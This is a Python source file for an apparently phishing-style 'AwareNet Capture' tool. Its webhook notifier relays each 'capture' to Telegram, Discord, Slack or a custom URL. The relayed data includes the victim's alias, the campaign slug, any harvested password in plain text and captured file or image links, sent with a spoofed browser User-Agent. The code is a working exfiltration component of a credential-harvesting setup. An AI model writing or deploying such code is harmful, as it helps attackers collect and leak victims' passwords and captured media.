import json, threading, urllib.request, urllib.error
from datetime import datetime

class WebhookNotifier:
    def __init__(self):
        self.hooks = {}

    def load(self, configs):
        self.hooks = {}
        for c in configs:
            platform = c.get("platform", "")
            url = c.get("url", "")
            enabled = c.get("enabled", False)
            events = c.get("events", ["capture"])
            if url and enabled:
                self.hooks[platform] = {"url": url, "events": events}

    def is_configured(self):
        return bool(self.hooks)

    def notify(self, event_type, data):
        for platform, cfg in self.hooks.items():
            if event_type not in cfg["events"]:
                continue
            payload = self._build_payload(platform, event_type, data)
            if payload:
                threading.Thread(target=self._send, args=(cfg["url"], payload, platform), daemon=True).start()

    def _build_payload(self, platform, event_type, data):
        ts = datetime.now().strftime("%H:%M:%S %d/%m/%y")
        alias = data.get("alias", "unknown")
        slug = data.get("slug", "")
        cap_type = data.get("type", "capture")
        url_val = data.get("url", "")

        if platform == "telegram":
            msg = f"⚠️ AwareNet Capture\n\nTarget: {alias}\nType: {cap_type}\nCampaign: /{slug}\nTime: {ts}"
            if data.get("url"):
                msg += f"\nFile: {data['url']}"
            if data.get("password"):
                msg += f"\nPassword: {data['password']}"
            return {"chat_id": "", "text": msg, "parse_mode": "HTML"}

        if platform == "discord":
            embeds = [{
                "title": "AwareNet Capture",
                "color": 16711680,
                "fields": [
                    {"name": "Target", "value": alias, "inline": True},
                    {"name": "Type", "value": cap_type, "inline": True},
                    {"name": "Campaign", "value": f"/{slug}", "inline": True},
                    {"name": "Time", "value": ts, "inline": False},
                ]
            }]
            if data.get("password"):
                embeds[0]["fields"].append({"name": "Password", "value": f"||{data['password']}||", "inline": False})
            if url_val.startswith("http"):
                embeds[0]["image"] = {"url": url_val}
            return {"embeds": embeds}

        if platform == "slack":
            blocks = [
                {"type": "header", "text": {"type": "plain_text", "text": "⚠️ AwareNet Capture"}},
                {"type": "section", "fields": [
                    {"type": "mrkdwn", "text": f"*Target:* {alias}"},
                    {"type": "mrkdwn", "text": f"*Type:* {cap_type}"},
                ]},
                {"type": "section", "fields": [
                    {"type": "mrkdwn", "text": f"*Campaign:* /{slug}"},
                    {"type": "mrkdwn", "text": f"*Time:* {ts}"},
                ]},
            ]
            if data.get("password"):
                blocks.append({"type": "section", "text": {"type": "mrkdwn", "text": f"*Password:* ||{data['password']}||"}})
            if url_val.startswith("http"):
                blocks.append({"type": "image", "image_url": url_val, "alt_text": "Capture"})
            return {"blocks": blocks}

        if platform == "webhook":
            normalised = dict(data)
            normalised["timestamp"] = ts
            normalised["event"] = event_type
            return normalised

        return None

    def _send(self, url, payload, platform):
        try:
            if platform == "telegram":
                chat_id = self.hooks.get(platform, {}).get("url", "").split("?chat_id=")
                if len(chat_id) > 1:
                    payload["chat_id"] = chat_id[1].split("&")[0]
                    url = url.split("?")[0] + "/sendMessage"
            data = json.dumps(payload).encode("utf-8")
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            print(f"[WEBHOOK ERROR] {platform}: {e}")

webhook_notifier = WebhookNotifier()
